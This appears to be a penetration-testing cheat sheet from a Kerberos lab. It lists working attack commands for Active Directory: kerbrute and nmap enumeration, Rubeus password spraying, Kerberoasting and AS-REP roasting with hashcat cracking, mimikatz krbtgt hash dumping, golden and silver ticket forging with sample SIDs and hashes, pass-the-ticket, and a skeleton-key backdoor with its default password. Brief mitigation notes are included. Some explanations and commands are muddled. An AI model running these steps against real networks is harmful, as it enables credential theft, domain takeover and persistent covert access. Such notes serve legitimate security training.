
**This will cover the following topics**

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

### Enumerate usernames with kerbrute
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local ad-usernames.txt -v

**Enumerate with nmap**
└─$ nmap -p 88 -script-args krb5-enum-users.realm=’10.11.70.89’,userdb=ad-usernames.txt ...DC IP...

### Rubeus
*Attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting. brute force passwords as well as password spray user accounts

**Harvest tickets every 30 sec**
.\Rubeus harvest /interval:30
### Add host to windows hosts file 
echo 10.10.10.10 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
### Password spray with Rubeus
<i>Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.</i>

Rubeus.exe brute /password:Password1 /noticket

### Kerberoast with Rubeus
*Will automatically dump Kerberos hash of any kerberoastable users

Rubeus.exe kerberoast

## ASREP Roast with Rubeus
<i>This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.</i>

Rubeus.exe asreproast

### Crack the kerberos hash with Hashcat
hashcat -m 13100 -a 0 HASH.txt rockyou.txt

output:
...snipped.....fd67337290d589b1436f6b56:MYPassword123#

### Kerberoasting with Impacket 

1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - Crack the hash


**Kerberoasting Mitigation 
-  Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
-  Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.


### AS-REP Roasting with Rubeus
*Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.

Rubeus.exe asreproast

*This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

*Insert 23$ after $krb5asrep so that the first line will be $krb5asrep$23User.....

*crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
hashcat -m 18200 hash.txt Pass.txt


**AS-REP Roasting Mitigations**
- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.


### Pass the ticket with mimikatz
*You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.

1.) `cd Downloads` - navigate to the directory mimikatz is in

2.) `mimikatz.exe` - run mimikatz

3.) `privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz

4.) `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in (preferably the administrator krbtgt ticket )


**Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.**

1.) `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket.

2.) `klist` - Verifying that we successfully impersonated the ticket by listing our cached tickets.
List the files in the administrator share
``\\10.10.210.21\admin$``


**Pass the ticket mitigation**
- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.


##  Golden/Silver Ticket Attacks with mimikatz

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

**KRBTGT Overview**

A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.


**Golden/Silver Ticket Attack Overview**

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain, this would preferably be a domain admin, however, for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

## Dump the krbtgt hash 

﻿1.)  mimikatz.exe 
﻿
2.) privilege::debug - ensure this outputs [privilege '20' ok]

﻿3.) lsadump::lsa /inject /name:krbtgt - 
﻿This will dump the hash as well as the security identifier needed to create a Golden Ticket. To
﻿create a silver ticket you need to change the /name: to dump the hash of either a domain admin
﻿account or a service account such as the SQLService account.
﻿
﻿﻿**Create a Golden/Silver Ticket**
﻿﻿
﻿1.) `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

**Use the Golden/Silver Ticket to access other machines**

﻿1.) `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

**Golden Ticket Example:**
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:88cc87377b02a885b84fe7050f336d9b /id:500


**Use the Golden/Silver Ticket to access other machines**

﻿1.) `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

**Silver Ticket Example:**
Kerberos::silver /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:NTLM-hash-here /id:500



## Kerberos Backdoors with mimikatz

*Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

*The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

*The default hash for a mimikatz skeleton key is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password -"_mimikatz_"

*This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.*

**Skeleton Key Overview**

*The skeleton key works by abusing the AS-REQ encrypted timestamps as said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.*

**Preparing Mimikatz**
1.) `cd Downloads && mimikatz.exe` - Navigate to the directory mimikatz is in and run mimikatz

2.) `privilege::debug` - This should be a standard for running mimikatz as mimikatz needs local administrator access

**Installing the Skeleton Key w/ mimikatz**
1.) `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful


**Accessing the forest**

The default credentials will be: "_mimikatz_"  

example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.
